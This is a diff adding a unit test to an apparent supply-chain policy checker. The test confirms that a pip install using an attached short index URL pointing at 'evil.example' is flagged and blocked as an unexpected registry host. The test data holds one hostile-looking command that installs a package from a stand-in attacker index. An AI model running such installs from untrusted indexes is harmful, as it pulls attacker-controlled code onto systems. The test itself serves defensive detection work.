@@ -392,6 +392,21 @@ def test_versioned_python_pip_install_is_classified() -> None:
 
 
 @pytest.mark.unit
+def test_pip_attached_short_index_url_is_checked_for_registry_policy() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence="$ pip install -ihttps://evil.example/simple demo==1.0.0",
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+
+
+@pytest.mark.unit
 def test_pip_argument_parser_handles_editable_requirements_and_registry_edge_cases() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
